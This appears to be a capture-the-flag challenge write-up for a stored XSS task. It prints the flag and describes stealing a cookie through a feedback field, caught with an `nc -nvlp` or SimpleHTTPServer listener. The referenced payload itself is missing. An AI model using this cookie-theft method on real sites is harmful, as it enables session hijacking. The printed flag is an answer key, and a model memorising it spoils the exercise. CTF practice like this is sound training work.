## Description

It was nice of you to visit me today. I hope you are having a good time. I'll look at your feedback soon and if you're nice enough then I will give you a treat.

## Flag

```
CTF{XSS-i5-s0-eZ}
```

## Hints

1. Try to capture the request

2. Bankrobber HTB initial stage is very similar

3. XSS steal cookie.

## Solution

The "Your Entry" field allows for a long-ish comment to be added. Paste a payload like this to try and steal the cookie. Use `python SimpleHTTPServer xxxx` or `nc -nvlp xxxx` to capture the request. The cookie contains the flag.
